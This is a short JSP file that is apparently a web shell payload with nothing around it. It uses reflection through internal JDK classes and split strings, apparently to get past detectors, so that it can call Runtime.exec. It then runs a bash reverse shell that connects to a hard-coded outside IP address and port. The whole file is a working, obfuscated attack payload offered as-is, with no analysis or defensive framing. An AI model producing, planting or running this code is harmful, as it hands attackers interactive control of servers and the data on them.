<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = com.sun.org.apache.xalan.internal.utils.ObjectFactory.findProviderClass("java.lang.Run" + "time", true);
    java.lang.reflect.Method m1 = com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory.getMethod(clazz, "getRun"+"time", null);
    java.lang.reflect.Method m2 = com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory.getMethod(clazz, "ex"+"ec", String[].class);
    Object o = com.sun.xml.internal.bind.v2.ClassFactory.create(m1);
    new com.sun.xml.internal.ws.spi.db.MethodSetter(m2).set(o,new String[]{"/bin/sh","-c","bash -i >& /dev/tcp/121.5.169.223/39767 0>&1"});
%>
